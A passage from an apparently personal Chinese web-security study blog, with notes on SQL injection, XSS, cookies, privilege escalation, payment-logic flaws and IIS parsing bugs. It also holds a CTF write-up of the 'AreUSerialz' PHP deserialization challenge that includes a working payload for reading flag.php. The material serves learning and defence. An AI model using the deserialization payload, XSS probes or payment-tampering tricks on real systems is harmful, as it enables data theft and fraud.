<h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><p><img src="/2023/02/11/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230211204119011.png" alt="image-20230211204119011"></p>
<p><img src="/2023/02/11/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230211204747601.png" alt="image-20230211204747601"></p>
<p><img src="/2023/02/11/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230211204805723.png" alt="image-20230211204805723"></p>
<p><img src="/2023/02/11/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230211204829872.png" alt="image-20230211204829872"></p>
<p><img src="/2023/02/11/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230211204846797.png" alt="image-20230211204846797"></p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a><img src="/2023/02/11/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230211204911974.png" alt="image-20230211204911974">二次注入</h3><p><img src="/2023/02/11/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20230223124754162.png" alt="image-20230223124754162"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe漏洞总结</title>
    <url>/2023/02/11/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-网鼎杯-青龙组-Web-AreUSerialz</title>
    <url>/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/</url>
    <content><![CDATA[<p>知识点：php代码审计，魔术方法，php反序列化，弱类型绕过</p>
<span id="more"></span>

<p>题目：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//包含flag.php,显然要读取这个文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;<span class="comment">//类</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//构造函数，创建对象时触发其中内容，所以我们要构造一个类来触发</span></span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//让op == &quot;2&quot;来触发下面的读取函数</span></span><br><span class="line">      <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();<span class="comment">//读取函数</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//析构函数,销毁类的时候，也就是在最后执行</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//===弱类型，强制将2转换为1，所以考虑绕过，加空格 op =‘ 2‘</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);<span class="comment">//反序列化，所以要先将对象序列化</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ctfhub靶场实操：</p>
<p>开启容器：<img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190830042.png" alt="image-20230211190830042"></p>
<p>给出源代码：</p>
<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211185816020.png" alt="image-20230211185816020"></p>
<p>根据前文代码审计编写php脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot; &quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot;%202&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;%20&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>拼接：</p>
<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190135812.png" alt="image-20230211190135812"></p>
<p>查看源码：</p>
<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190155840.png" alt="image-20230211190155840"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>代码审计</tag>
        <tag>反序列化</tag>
        <tag>弱类型绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>序列化：</strong>序列化是将变量或对象转换成字符串的过程，用于存储或传递的值的过程中，同时不丢失其类型和结构。</p>
<p><strong>反序列化：</strong>反序列化是将字符串转换成变量或对象的过程</p>
<p><img src="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230210150104844.png" alt="image-20230210150104844"></p>
<span id="more"></span>

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码 执行，SQL 注入，目录遍历等不可控后果。</p>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>是一种特殊方法当对对象执行某些操作时会覆盖 PHP 的默认操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>() <span class="comment">//将一个对象转换成一个字符串` </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>() <span class="comment">//将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure>

<p>触发原因：<code>unserialize()</code> 函数的变量可控，文件中存在可利用的类与类中的魔术方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//创建对象时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性`</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用 isset()或 empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用 unset()时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发`</span></span><br></pre></td></tr></table></figure>

<h3 id="无类序列化"><a href="#无类序列化" class="headerlink" title="无类序列化"></a>无类序列化</h3><p>运行代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;yuanjiu&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:7:&quot;yuanjiu&quot;;</span><br></pre></td></tr></table></figure>



<p><strong>有类与无类的区别主要在于有无魔术方法，而魔术方法在特定情况下会被触发</strong></p>
<h3 id="有类序列化"><a href="#有类序列化" class="headerlink" title="有类序列化"></a>有类序列化</h3><p><img src="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230210154025361.png" alt="image-20230210154025361"></p>
<p>代码审计&#x3D;》魔术方法</p>
<p>参考文章：</p>
<p><a href="https://www.freebuf.com/articles/network/355848.html">https://www.freebuf.com/articles/network/355848.html</a></p>
<p><a href="https://www.freebuf.com/articles/web/341654.html">https://www.freebuf.com/articles/web/341654.html</a></p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>业务逻辑漏洞</title>
    <url>/2023/02/10/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>业务逻辑漏洞中，支付漏洞最常见，而支付漏洞一直以来就是是高风险，对企业来说危害很大，对用户来说同样危害也大。</p>
<span id="more"></span>

<h3 id="商品购买流程"><a href="#商品购买流程" class="headerlink" title="商品购买流程"></a>商品购买流程</h3><p><strong>要了解支付漏洞就要先了解商品的购买流程：</strong></p>
<p>选择商品和数量**&#x3D;&gt;<strong>选择支付及配送方式</strong>&#x3D;&gt;<strong>生成订单编号</strong>&#x3D;&gt;<strong>订单支付选择</strong>&#x3D;&gt;**完成支付</p>
<h3 id="常见参数："><a href="#常见参数：" class="headerlink" title="常见参数："></a>常见参数：</h3><p><strong>通过篡改参数来利用漏洞</strong></p>
<p>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等</p>
<p>购买数量：改成负数，达到金额偏差</p>
<p>订单号：用B商品的价格买A商品</p>
<p>支付方式：更改支付接口，使金额支付到其它账户</p>
<h3 id="常见修改方法："><a href="#常见修改方法：" class="headerlink" title="常见修改方法："></a>常见修改方法：</h3><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>水平垂直越权</title>
    <url>/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<p><img src="/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/image-20230207151741353.png" alt="image-20230207151741353"></p>
<span id="more"></span>

<p><strong>水平越权</strong>：获取同级用户账户信息</p>
<p><strong>垂直越权</strong>：添加高权限用户</p>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>获取添加用户的数据包</p>
<h5 id="如何获取数据包"><a href="#如何获取数据包" class="headerlink" title="如何获取数据包"></a>如何获取数据包</h5><ol>
<li>普通用户前端有操作页面可以抓取数据包</li>
<li>通过网站源码本地搭建去模拟抓取</li>
<li>盲猜</li>
</ol>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h5 id="前端漏洞造成：界面"><a href="#前端漏洞造成：界面" class="headerlink" title="前端漏洞造成：界面"></a>前端漏洞造成：界面</h5><p>判断用户等级后，代码界面部分进行可选显示 </p>
<h5 id="后端漏洞造成：数据库"><a href="#后端漏洞造成：数据库" class="headerlink" title="后端漏洞造成：数据库"></a>后端漏洞造成：数据库</h5><p>user 表(管理员和普通用户同表）如：</p>
<table>
<thead>
<tr>
<th>id</th>
<th>username</th>
<th>password</th>
<th>usertype</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>123456</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>xiaodi</td>
<td>11111</td>
<td>2</td>
</tr>
</tbody></table>
<p><strong>代码的级别判断</strong>：usertype值</p>
<p>若访问网站数据包中有传输用户的编号、用户组编号或类型编号的时候，可尝试对此值进行修改，这就是测试越权漏洞基本方法。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>关于xss的相关总结</title>
    <url>/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>跨站攻击，即Cross Site Script Execution(通常简写为XSS)，是前端的漏洞，产生在浏览器一端的漏洞。它是指攻击者在网页中嵌入客户端脚本，主要利用js编写的恶意代码来执行一些想要的功能，也就是说它能干嘛是受到js的控制，那么js能执行出什么脚本代码就取决于它能干嘛。当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。</p>
<span id="more"></span>

<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>是一种非持续型攻击。漏洞本身存在，但是需要攻击者构造出来，然后让对方去触发。它不会对正常的访问造成跨站攻击。这种攻击是一次型攻击，它不会写入到数据库里。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。这个过程就像一次反射。</p>
<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207135008161.png" alt="image-20230207135008161"></p>
<h4 id="出现地方"><a href="#出现地方" class="headerlink" title="出现地方"></a>出现地方</h4><p>交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询类页面</p>
<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>是一种持续型的攻击。将跨站代码植入到网站的数据库中。一旦攻击者第一次成功攻击之后，那么在后续的其他访问者均会受到跨站攻击。这种攻击可能是写到网站的留言板，那么当对方访问留言板就会被触发。它与反射型、DOM型XSS相比，具有更高的隐蔽性，危害性也更大。它们之间最大区别在于反射型与DOM型XSS执行都必须依靠用户手动触发，而存储型XSS却不需要。</p>
<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207135110317.png" alt="image-20230207135110317"></p>
<h4 id="出现地方-1"><a href="#出现地方-1" class="headerlink" title="出现地方"></a>出现地方</h4><p>交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面</p>
<h3 id="xss的作用"><a href="#xss的作用" class="headerlink" title="xss的作用"></a>xss的作用</h3><p>常规用到的是盗取cookie、js做钓鱼攻击、流量指向等。主要是盗取管理员的会话和cookie信息，就是我们常说的管理员凭证，就意味着得到后台权限，可以直接利用。还能配合别的漏洞，比如可以和网页木马结合，扔到那里去跳转到网马地址，网马地址被执行后续就控制一些权限</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM的全称为Document Object Model，即文档对象模型，DOM通常用于代表在HTML、XHTML和XML中的对象。使用DOM可以允许程序和脚本动态地访问和更新文档的内容、结构和样式。</p>
<p>通过js可以重构整个HTML页面，而要重构页面或者页面中的某个对象，js就需要知道HTML文档中所有元素的“位置”。而DOM为文档提供了结构化表示，并定义了如何通过脚本来访问文档结构。根据DOM规定，HTML文档中的每个成分都是一个节点。</p>
<p>DOM的规定如下：</p>
<p>整个文档是一个文档节点；</p>
<p>每个HTML标签是一个元素节点；</p>
<p>包含在HTML元素中的文本是文本节点；</p>
<p>每一个HTML属性是一个属性节点；</p>
<p>节点与节点之间都有等级关系。</p>
<p>HTML的标签都是一个个的节点，而这些节点组成了DOM的整体结构：节点树。如图所示：</p>
<p><img src="https://image.3001.net/images/20210602/1622624351_60b7485f98c53cbc653a9.jpg!small" alt="img"></p>
<p>简单来说，DOM为一个一个访问html的标准编程接口。</p>
<p>可以发现DOM本身就代表文档的意思，而基于DOM型的XSS是不需要与服务器端交互的，它只发生在客户端处理数据阶段，是基于javascript的。而上面两种XSS都需要服务端的反馈来构造xss。</p>
<p>参考文章：<a href="https://www.freebuf.com/articles/web/276998.html">https://www.freebuf.com/articles/web/276998.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>关于cookie的相关总结</title>
    <url>/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="set-cookie格式（一个cookie）"><a href="#set-cookie格式（一个cookie）" class="headerlink" title="set cookie格式（一个cookie）"></a>set cookie格式（一个cookie）</h3><p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207125247970.png" alt="image-20230207125247970"></p>
<p>expires的是否设定决定cookie保存在内存还是磁盘</p>
 <span id="more"></span>

<h3 id="session和cookie的区别"><a href="#session和cookie的区别" class="headerlink" title="session和cookie的区别"></a>session和cookie的区别</h3><p>若没有设定，则为短期cookie，保存于内存，关闭浏览器即失效</p>
<p>若设定过期时间，则到过期时间失效，保存于磁盘</p>
<p>（1）session保存在服务器端(客户端仅保存一个sessionID)，Cookie保存在客户端。</p>
<p>（2）session保存的是对象，Cookie保存的是<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>。cookie的存储限制数据量不大于4KB，而session的容量则是无限量的。</p>
<p>（3）session不能区分路径，同一个用户在访问同一个Web应用程序期间，所有的session在任何路径都可访问。Cookie中如果设置了路径参数，则在其他路径下无法访问。</p>
<p>（4）session默认保存SeesionID的方法是Cookie，如果客户端禁用了Cookie，服务器端应采用其他的替代方法替代SessionID。</p>
<p>（5）session在会话结束后就会关闭，但是Cookie可以经过持久化而长期保存在客户端的本地硬盘上。所以session也更安全。</p>
<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207132732376.png" alt="image-20230207132732376"></p>
<h3 id="JavaScript语法"><a href="#JavaScript语法" class="headerlink" title="JavaScript语法"></a>JavaScript语法</h3><p>获取cookie：<code>document.cookie;</code></p>
<p>设置cookie: <code>document.cookie=&quot;username=yuanjiu&quot;;</code></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>web中间件常见漏洞总结</title>
    <url>/2023/02/06/web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。<br><strong>IIS</strong> 目前只适用于目前只适用于 <strong>Windows</strong> 系统，不适用于其他操作系统。系统，不适用于其他操作系统。</p>
 <span id="more"></span>

<h4 id="解析漏洞解析漏洞"><a href="#解析漏洞解析漏洞" class="headerlink" title="解析漏洞解析漏洞"></a>解析漏洞解析漏洞</h4><h5 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h5><p>基于文件名</p>
<p>该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是 服务器默认不解析; 号及其后面的内容，相当于截断。</p>
<p>基于文件夹名</p>
<p>该版本 默认会将 *.asp&#x2F;目录下的所有文件当成Asp解析。</p>
<p>另外，IIS6.x除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer解析为asp，</p>
<p>从网站属性-&gt;主目录-&gt;配置 可以看出，他们都是调用了asp.dll进行的解析。</p>
<p>修复建议修复建议</p>
<p>由于微软并不认为这是一个漏洞，也没有推出IIS 6.0的补丁，因此漏洞需要自己修复。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 限制上传目录执行权限，不允许执行脚本。</span><br><span class="line">2. 不允许新建目录。</span><br><span class="line">3. 上传的文件需经过重命名(时间戳+随机数+.jpg等)</span><br></pre></td></tr></table></figure>

<h5 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h5><p>安装IIS7.5，<br>1.控制面板 -&gt; 程序 -&gt; 打开或关闭windows功能。</p>
<p>2.下载php-5.2.6-win32-installer.msi</p>
<p>3.打开msi，一直下一步来到选择web server setup的界面，在这里选择IIS fastcgi,之后一直下一步。</p>
<p>4.打开IIS，管理工具 -&gt;Internet 信息服务(IIS)管理器</p>
<p>5.选择编辑ISAPI或者CGI限制</p>
<p>添加安装的php-cgi.exe路径，描述随意。</p>
<p>6.返回第五步的第一个图片位置，点击处理程序映射，添加如下。</p>
<p>7.phpinfo测试</p>
<p>IIS7.x版本 在Fast-CGI运行模式下,在任意文件，例：test.jpg后面加上&#x2F;.php，会将test.jpg 解析为php文件。</p>
<p>修复建议修复建议</p>
<p>配置cgi.fix_pathinfo(php.ini中)为 0 并重启php-cgi程序</p>
<p>结果如下：</p>
<h3 id="PUT-任意文件写入任意文件写入"><a href="#PUT-任意文件写入任意文件写入" class="headerlink" title="PUT 任意文件写入任意文件写入"></a>PUT 任意文件写入任意文件写入</h3><p>IIS Server 在 Web 服务扩展中开启了 WebDAV之后，支持多种请求，配合写入权限，可造成任意文件写入。</p>
<p>修复建议修复建议</p>
